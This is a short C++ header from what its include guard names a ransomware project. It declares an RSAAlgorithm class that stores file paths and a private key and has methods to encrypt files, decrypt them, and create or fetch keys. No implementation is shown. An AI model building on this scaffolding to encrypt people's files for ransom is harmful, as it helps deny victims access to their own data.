//
// Created on 22.01.20.
//

#ifndef RANSOMWARE_RSA_ALGO_H
#define RANSOMWARE_RSA_ALGO_H

#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <boost/filesystem/path.hpp>
#include <iostream>

#include "algorithm.h"

class RSAAlgorithm : public Algorithm {

private:
    std::vector<boost::filesystem::path> _files;
    static RSA* _privateKey;

public:
    RSAAlgorithm();
    ~RSAAlgorithm();

    void encrypt(std::vector<boost::filesystem::path>&);
    void decrypt();

    void createPrivateKey();
    void createPublicKey();

    void getPrivateKey();
    void getPublicKey();
};


#endif //RANSOMWARE_RSA_ALGO_H
